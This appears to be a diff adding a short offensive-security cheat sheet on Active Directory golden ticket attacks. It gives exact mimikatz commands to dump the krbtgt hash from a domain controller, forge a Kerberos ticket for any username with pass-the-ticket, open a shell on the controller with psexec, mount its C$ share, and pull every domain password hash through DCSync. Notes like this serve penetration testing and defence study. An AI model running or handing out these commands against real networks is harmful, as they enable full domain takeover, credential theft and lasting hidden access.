@@ -1,0 +1,39 @@
+
+
+in silver ticket we craft TGS from service hash, in golden ticket we craft TGT from krbtgt hash.
+we should have access to a user member of the Domain Admins Group or we have compromised the Domain controler itself. we should access to the DC to take the krebhash:
+
+run mimikatz on the domain controler and get the kerbtgt hash:
+
+	mimikatz# privilege::debug
+
+	mimikatz# lsadump::lsa /patch
+
+when we have the kerbtgt we dont need the admin privileges anymore, using mimikatz againg to craft the ticket:
+
+	mimikatz# kerberos::golden /user:fakeuser /domain:tshoot.com /sid:SID= S-1-5-21-<three Random numbers> /krbtgt:<NTLM kerbtgt hash> /ptt     
+	
+	mimikatz# misc::cmd
+
+we can here put any username even if it not of the domain but we prefer to put an admin name.
+!note: in modern servers we should put an admin username.
+
+then we can open a Domain Controler shell whenever we want:
+
+	psexec.exe \\DC cmd.exe
+
+or we can access any file on the DC:
+	
+	net use O:\\DC.tshoot.com\c$
+
+===================================================================================================================
+
+
+we could steal NTDS.dit file (similar to sam file on local account) but there is better way, we can ask DC to give us any user hash he has, we just have to log on account who is member of domain admin group,then type:
+
+	mimikatz# lsadump::dcsync /user:Administrator
+
+this give us all the hashes the DC has.
+
+
+
